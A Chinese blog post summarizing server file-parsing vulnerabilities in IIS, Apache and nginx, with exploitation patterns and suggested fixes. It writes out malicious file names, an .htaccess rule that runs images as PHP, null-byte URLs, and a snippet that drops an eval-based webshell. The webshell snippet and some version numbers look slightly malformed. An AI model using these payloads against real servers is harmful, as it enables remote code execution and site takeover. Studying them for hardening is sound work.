---
layout: post
title:  "服务器解析漏洞总结"
date:   2018-11-30 20:15:33 +0700
categories: [服务器]
---

> 解析漏洞主要说的是一些特殊文件被IIS、apache、nginx服务器在某种情况下解析成脚本文件格式执行的漏洞

## 0x00 IIS 5.x / 6.0解析漏洞

使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。

**IIS6.0解析漏洞有两种利用方法：**

1. 目录解析
2. 文件解析

### 目录解析

在网站下建立**文件夹**的名字为`.asp，.asa` 的文件夹，其目录内的任何扩展名文件都被IIS当作 `asp` 文件来解析执行。

```
/xx.asp/1.jpg
/xx.asa/1.jpg
```

例如创建目录`cracer.asp`：

`1.jpg`在`cracer.asp`下：`cracer.asp/1.jpg`，将被当作asp文件来执行。

### 文件解析

格式为：

```
cracer.asp;.jpg
```

在IIS6.0下，分号后面的不被解析，也就是说读取分号后就不再都后面的后缀名了。

`cracer.asp;.jpg` 会被服务器看成是`cracer.asp` 执行。

### 解析文件类型

IIS6.0 默认的可执行文件除了asp还包含这三种 :

```
/test.asa
/test.cer
/test.cdx
```

##### 修复方案

1. 目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。
2. 做好权限设置，限制用户创建文件夹。

## 0x01 Apache解析漏洞

**原理：** apache是从右到左开始判断解析，如果为不可识别的后缀解析，就再往左继续判断。

当文件为`cracer.php.owf.rar`，其中`.owf` 和 `.rar` 这两种后缀apache视为不可识别解析，apache就会把`cracer.php.owf.rar`识别为`php`文件。

如何判断是不是合法的后缀是这个漏洞利用的关键

**配置文件漏洞：**

1. 如果在Apache中，`htaccess` 可被执行而且可被执行，如果在`.htaccess`写入

   ```
    AddType application/x-httpd-php .jpg
   ```

   即使扩展名是 jpg，一样能以 php 方式执行。

2. 如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。

**修复方案：**

1. 禁止`.php.` 的文件执行
2. 使用伪静态

## 0x02 IIS 7.0/7.5 nginx<8.03畸形解析漏洞

**漏洞：** Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问`www.xx.com/phpinfo.jpg/1.php`这个URL时，`$fastcgi_script_name`会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP  CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到`fix_pathinfo`这个选项了。  如果开启了这个选项，那么就会触发在PHP中的如下逻辑：

​	PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了

在默认`Fast-cgi`开启下，如果上传一个名字为`1.jpg`文件，内容为

```php
<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd]?>');?>
```

访问：`1.jpg/.php` 

那么在这个目录下会生成一句话木马`shell.php`

##### 修复方案

1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;
2.在Nginx配置文件中添加以下代码：

```php
　　if ( $fastcgi_script_name ~ ..*/.*php ) {
　　return 403;
　　}
```

## 0x03 nginx <8.03 空字节代码执行

影响：0.5，0.6，0.7<=0.765，0.8<= 0.8.37

nginx在图片中嵌入php代码然后访问

```
www.xxxx.com/UploadFiles/image/1.jpg/1.php
www.xxxx.com/UploadFiles/image/1.jpg%00.php
www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php
```

